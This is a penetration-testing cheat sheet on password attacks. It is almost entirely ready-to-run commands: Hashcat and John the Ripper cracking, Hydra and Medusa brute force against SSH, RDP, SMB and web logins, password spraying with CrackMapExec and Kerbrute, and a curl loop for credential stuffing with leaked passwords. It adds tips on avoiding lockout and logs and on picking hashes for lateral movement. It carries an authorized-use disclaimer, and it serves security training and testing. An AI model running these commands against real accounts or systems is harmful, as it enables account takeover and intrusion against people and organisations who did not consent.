# Password Attacks (Cracking, Brute Force & Credential Exploitation)

> For authorized security testing, CTF competitions, and educational purposes only.

Hash cracking, online brute force, wordlist generation, and credential attack
techniques for penetration testing engagements.

---

## Hash Identification

```bash
# hash-identifier (Kali built-in)
hash-identifier
# Paste hash, get possible types

# hashid
hashid '$2y$10$abc...'
hashid -m '$6$salt$hash...'   # -m shows Hashcat mode number

# Manual identification by prefix
# $1$         — MD5 (Unix)
# $2a$ / $2y$ — bcrypt
# $5$         — SHA-256 (Unix)
# $6$         — SHA-512 (Unix)
# $y$         — yescrypt
# No prefix, 32 hex chars  — MD5 / NTLM
# No prefix, 40 hex chars  — SHA-1
# No prefix, 64 hex chars  — SHA-256
# $krb5tgs$   — Kerberoast TGS
# $krb5asrep$ — AS-REP roast

# Name-That-Hash (modern alternative)
nth --text 'HASH_HERE'
nth --file hashes.txt
```

---

## Hashcat

### Common Modes

```bash
# Syntax: hashcat -m MODE -a ATTACK_TYPE hash_file wordlist

# Common hash modes (-m):
#   0    — MD5
#   100  — SHA-1
#   1400 — SHA-256
#   1700 — SHA-512
#   1000 — NTLM
#   1800 — sha512crypt ($6$)
#   3200 — bcrypt
#   500  — md5crypt ($1$)
#   5600 — NetNTLMv2
#   13100 — Kerberoast (krb5tgs)
#   18200 — AS-REP Roast (krb5asrep)
#   22000 — WPA-PBKDF2-PMKID+EAPOL (Wi-Fi)
#   11600 — 7-Zip
#   13400 — KeePass

# Attack modes (-a):
#   0 — Dictionary (straight)
#   1 — Combination
#   3 — Brute-force / Mask
#   6 — Hybrid wordlist + mask
#   7 — Hybrid mask + wordlist
```

### Dictionary Attack

```bash
# Basic dictionary attack
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Multiple wordlists (combination)
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Show cracked results
hashcat -m 1000 ntlm_hashes.txt --show

# Restore interrupted session
hashcat --restore
```

### Mask / Brute Force Attack

```bash
# Mask charsets:
#   ?l — lowercase (a-z)
#   ?u — uppercase (A-Z)
#   ?d — digits (0-9)
#   ?s — special chars
#   ?a — all printable (?l?u?d?s)

# 8-character lowercase brute force
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

# Common password patterns
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?l?d?d          # Word + 2 digits
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?l?d?d?d?d       # Word + 4 digits
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?s          # Word + digit + special

# Custom charset
hashcat -m 0 -a 3 -1 '?l?d' hashes.txt ?1?1?1?1?1?1?1?1  # lowercase + digits

# Hybrid: wordlist + mask appended
hashcat -m 0 -a 6 hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?d?d

# Hybrid: mask prepended + wordlist
hashcat -m 0 -a 7 hashes.txt ?d?d?d?d /usr/share/wordlists/rockyou.txt

# Increment mode — try length 1, then 2, then 3...
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a --increment --increment-min=4
```

### Performance & Options

```bash
# Use specific GPU
hashcat -m 0 hashes.txt wordlist.txt -d 1

# Benchmark all hash types
hashcat -b

# Benchmark specific mode
hashcat -b -m 1000

# Set workload profile (1=low, 2=default, 3=high, 4=insane)
hashcat -m 0 hashes.txt wordlist.txt -w 3

# Output cracked to file
hashcat -m 0 hashes.txt wordlist.txt -o cracked.txt

# Potfile — previously cracked hashes (auto-skip)
# Located at ~/.local/share/hashcat/hashcat.potfile
```

---

## John the Ripper

```bash
# Auto-detect hash type
john hashes.txt

# Specify format
john --format=raw-md5 hashes.txt
john --format=raw-sha256 hashes.txt
john --format=nt hashes.txt                # NTLM
john --format=sha512crypt hashes.txt       # $6$
john --format=bcrypt hashes.txt
john --format=krb5tgs hashes.txt           # Kerberoast

# Wordlist mode
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# With rules (mangling)
john --wordlist=wordlist.txt --rules=best64 hashes.txt
john --wordlist=wordlist.txt --rules=jumbo hashes.txt

# Incremental (brute force)
john --incremental hashes.txt
john --incremental=digits hashes.txt       # digits only

# Show cracked passwords
john --show hashes.txt

# Specific hash file conversions (john2 utilities)
ssh2john id_rsa > ssh_hash.txt             # SSH private key
zip2john protected.zip > zip_hash.txt      # ZIP file
rar2john protected.rar > rar_hash.txt      # RAR file
keepass2john database.kdbx > kp_hash.txt   # KeePass
pdf2john protected.pdf > pdf_hash.txt      # PDF
office2john document.docx > doc_hash.txt   # Office documents
```

---

## Hydra (Online Brute Force)

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1
hydra -L users.txt -P passwords.txt ssh://10.0.0.1 -t 4  # 4 threads

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.1

# HTTP Basic Auth
hydra -l admin -P wordlist.txt 10.0.0.1 http-get /admin/

# HTTP POST form
hydra -l admin -P wordlist.txt 10.0.0.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
#                                                ^^^^^^^^^^^^^^^ failure string

# HTTPS POST form
hydra -l admin -P wordlist.txt 10.0.0.1 https-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: session=abc"

# SMB
hydra -l administrator -P wordlist.txt smb://10.0.0.1

# RDP
hydra -l administrator -P wordlist.txt rdp://10.0.0.1

# MySQL
hydra -l root -P wordlist.txt mysql://10.0.0.1

# SMTP
hydra -l user@example.com -P wordlist.txt smtp://mail.example.com

# Common options
hydra -t 4           # threads (be careful with account lockout)
hydra -w 5           # timeout per connection
hydra -f             # stop after first valid pair found
hydra -V             # verbose — show every attempt
hydra -o results.txt # output to file
```

---

## Medusa

```bash
# SSH
medusa -h 10.0.0.1 -u admin -P wordlist.txt -M ssh

# FTP
medusa -h 10.0.0.1 -u admin -P wordlist.txt -M ftp

# HTTP
medusa -h 10.0.0.1 -u admin -P wordlist.txt -M http -m DIR:/admin

# Multiple hosts
medusa -H hosts.txt -u admin -P wordlist.txt -M ssh

# Parallel hosts
medusa -H hosts.txt -u admin -P wordlist.txt -M ssh -T 5
```

---

## Wordlist Generation

### CeWL (Custom Word List Generator)

```bash
# Scrape website for words (custom wordlist from target's own content)
cewl https://target.com -d 3 -m 5 -w target_wordlist.txt
# -d 3 = spider depth 3
# -m 5 = minimum word length 5

# Include email addresses
cewl https://target.com -d 3 -m 5 -w wordlist.txt -e --email_file emails.txt

# With authentication
cewl https://target.com -d 3 -m 5 --auth_type basic --auth_user admin --auth_pass password -w wordlist.txt
```

### Crunch

```bash
# Generate all 4-char lowercase combinations
crunch 4 4 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# Pattern-based generation
crunch 8 8 -t @@@@%%%% -o wordlist.txt  # 4 lowercase + 4 digits
crunch 8 8 -t Company%% -o wordlist.txt # "Company" + 2 digits

# Charset files
crunch 6 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o wordlist.txt
```

### Other Wordlist Tools

```bash
# Username generation from names
# username-anarchy
username-anarchy --input-file names.txt > usernames.txt
# Generates: john.smith, jsmith, j.smith, smithj, etc.

# Mutate existing wordlist with rules
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt > mutated.txt

# Combine wordlists and deduplicate
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Common wordlists location (Kali)
ls /usr/share/wordlists/
# rockyou.txt — 14 million passwords
# /usr/share/seclists/ — comprehensive collection
```

---

## Password Spraying

```bash
# Spray one password across many users (avoids lockout)
# CrackMapExec
crackmapexec smb 10.0.0.5 -u users.txt -p 'Summer2024!' --continue-on-success

# Spray against multiple protocols
crackmapexec smb DC_IP -u users.txt -p 'Company123!' -d DOMAIN
crackmapexec winrm DC_IP -u users.txt -p 'Company123!' -d DOMAIN
crackmapexec ldap DC_IP -u users.txt -p 'Company123!' -d DOMAIN

# Kerbrute — Kerberos pre-auth spray (faster, no logs on failed attempts)
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Summer2024!'

# Enumerate valid usernames first
kerbrute userenum -d DOMAIN --dc DC_IP usernames.txt

# Hydra spray (one password, many users)
hydra -L users.txt -p 'Summer2024!' smb://10.0.0.5

# Common spray passwords to try
# Season+Year: Spring2024!, Summer2024!, Fall2024!, Winter2024!
# Company+digits: CompanyName1!, CompanyName123
# Welcome1!, Password1!, Changeme1!

# Timing — respect lockout policies
# Check AD lockout policy first:
# net accounts /domain
# Typically: 3-5 attempts, 30-min lockout window
# Spray 1 password, wait 35 minutes, spray next
```

---

## Credential Stuffing

```bash
# Test leaked credentials against target services
# Use breach databases (ethically sourced, authorized testing only)

# Burp Suite Intruder — Pitchfork attack type
# Position 1: usernames from breach
# Position 2: passwords from breach (paired 1:1)

# Hydra with paired credentials
hydra -C creds.txt 10.0.0.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"
# creds.txt format: username:password (one per line)

# Custom script approach
while IFS=: read -r user pass; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -d "username=$user&password=$pass" https://target.com/login)
  [ "$response" != "401" ] && echo "VALID: $user:$pass"
done < creds.txt
```

---

## Tips

- Always check for default credentials before brute forcing (admin:admin, root:root, etc.)
- Use password spraying over brute force in AD environments to avoid account lockout
- Hashcat is generally faster than John due to GPU acceleration
- For large hash files, use `--username` flag to keep track of which user each hash belongs to
- Prioritize cracking NTLM and NetNTLMv2 hashes -- they unlock lateral movement
- CeWL wordlists combined with hashcat rules are highly effective for targeted attacks
- Check for password policies before spraying: `net accounts /domain`
- Use `--potfile-path` in hashcat to maintain separate potfiles per engagement
- Rainbow tables are mostly obsolete due to salted hashes, but still work against unsalted MD5/NTLM

---

## References

- [Hashcat Wiki](https://hashcat.net/wiki/)
- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [John the Ripper](https://www.openwall.com/john/)
- [Hydra (THC)](https://github.com/vanhauser-thc/thc-hydra)
- [CeWL](https://github.com/digininja/CeWL)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [Kerbrute](https://github.com/ropnop/kerbrute)
- [CrackMapExec / NetExec](https://github.com/Pennyw0rth/NetExec)
- [Name-That-Hash](https://github.com/HashPals/Name-That-Hash)
